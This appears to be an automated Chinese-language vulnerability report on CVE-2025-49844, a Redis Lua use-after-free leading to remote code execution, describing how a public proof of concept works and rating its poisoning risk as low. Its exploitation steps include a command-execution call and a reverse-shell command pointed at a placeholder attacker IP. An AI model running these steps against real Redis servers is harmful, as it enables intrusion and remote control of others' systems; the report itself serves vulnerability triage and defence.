## CVE-2025-49844 - Redis Use-After-Free (UAF), 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** Use-After-Free (UAF), 远程代码执行 (RCE)

**影响应用:** Redis

**危害等级:** 严重

**CVSS评分:** 10.0 (Critical)

**影响版本:** Redis 8.2.1及更早版本

**利用条件:** 需要认证

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 5%

## 详情

POC有效性分析：
CVE-2025-49844是一个影响Redis Lua脚本引擎的严重UAF漏洞（CWE-416），允许认证用户远程代码执行。PoC (`demonstration.py`) 利用Redis Lua解释器中对块名称（chunkname）的处理缺陷。通过精心构造的Lua脚本，PoC首次调用 `myloader` 返回 `nil`，促使 `f_parser` 重新填充缓冲区，此时 `chunkname` 处于可回收状态。第二次调用 `myloader` 时，PoC触发垃圾回收，并通过 `get_smallstrs` 注入小字符串占用先前释放的内存区域。这种内存劫持技术允许攻击者覆盖 `chunkname`，从而控制Lua解释器的执行流，最终导致执行 `__redis__err__handler().source`，实现任意Lua代码执行和远程系统命令执行。`README.md` 展示了通过该PoC可直接执行shell命令或获取反向shell，确认了RCE能力。

利用步骤：
1.  环境：目标Redis服务器为8.2.1及更早版本，攻击者需认证凭据，建议使用 `redis:8.2.1-alpine/bookworm` Docker镜像。
2.  准备：获取PoC项目，安装Python依赖（如 `hexdump`, `iced-x86`, `redis`）。
3.  命令执行：使用 `uv run cve-2025-49844 command "echo 'hello world' > /data/hello.txt"` 在目标上执行命令。
4.  反向Shell：本地监听端口（如4444），然后执行 `uv run cve-2025-49844 rshell -l <攻击者IP地址> -p 4444` 以获取反向shell。
5.  验证：检查命令执行结果或反向shell连接。

投毒风险分析：
此CVE-2025-49844的PoC代码（位于 `/tmp/vulnwatchdog_b5b5a00c3330501d4f5cc3725db99365` 目录）被评估为**低投毒风险**，风险评分为5%。
首先，从项目**透明性与目的明确性**来看，其 `README.md` 文件清晰地将此项目定义为针对CVE-2025-49844的个人概念验证，并且明确提及了Wiz Research的相关工作。这表明其开发者意图是用于合法的安全研究和漏洞验证，而非恶意攻击或传播恶意软件。这种清晰的声明对于评估投毒风险至关重要。

其次，对**代码行为**进行深入分析：
1.  核心逻辑：`demonstration.py` 作为PoC的核心实现，其所有代码逻辑都围绕Redis Lua UAF漏洞的触发和利用展开。它主要通过标准的 `redis` Python客户端库与目标Redis服务器交互，执行 `script_flush` 和 `eval` 等合法的Redis命令。这些操作直接服务于漏洞的复现和验证，不包含任何偏离此目的的行为。
2.  代码可读性与混淆：代码中没有发现任何形式的混淆技术，所有函数、变量命名和逻辑流程都清晰可读。这使得安全研究人员和防御者能够轻松审查其内部工作原理，确保其不包含隐藏的恶意功能。
3.  网络行为：未发现PoC代码有向外部未知或可疑地址发送数据的行为。所有网络通信都明确指向由用户配置的目标Redis服务器，并且其作用是传输漏洞利用载荷和接收执行结果。没有发现任何意图进行数据窃取、C2通信或DDoS攻击的网络活动。
4.  文件系统与外部资源：PoC没有包含任何下载或执行可疑外部脚本或二进制文件的代码。所有必要的组件都包含在项目内部或通过标准的Python包管理系统（如 `uv`）进行安装，且这些组件都是已知的、合法的安全研究或开发工具。
5.  依赖项：`pyproject.toml` 文件明确列出了所有项目依赖，包括 `hexdump` (用于十六进制数据显示), `iced-x86` (x86汇编/反汇编库) 和 `redis` (Redis Python客户端)。这些都是安全研究和逆向工程领域常用的合法库，没有包含任何不常见或具有潜在恶意功能的第三方库。

最后，关于**攻击载荷的性质**，PoC所演示的“命令执行”和“反向shell”功能是远程代码执行漏洞的常见利用结果，并非PoC代码本身的恶意行为。PoC本身只是提供了一个机制来注入和执行这些载荷，载荷的内容（例如 `echo 'hello world'` 或反向shell脚本）是攻击者根据其需求提供的。换言之，PoC代码自身不会自行发起恶意攻击，它只是一个工具。

总结：鉴于该PoC代码的开放性、逻辑的清晰性以及其明确定义为防御性安全研究工具的性质，我们可以确定它不包含任何恶意代码或投毒行为。使用者在运行前可以轻松审查其源代码，确认其安全性。因此，可以安全地用于合法的漏洞研究和安全评估工作。

**项目地址:** file:///tmp/vulnwatchdog_b5b5a00c3330501d4f5cc3725db99365

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
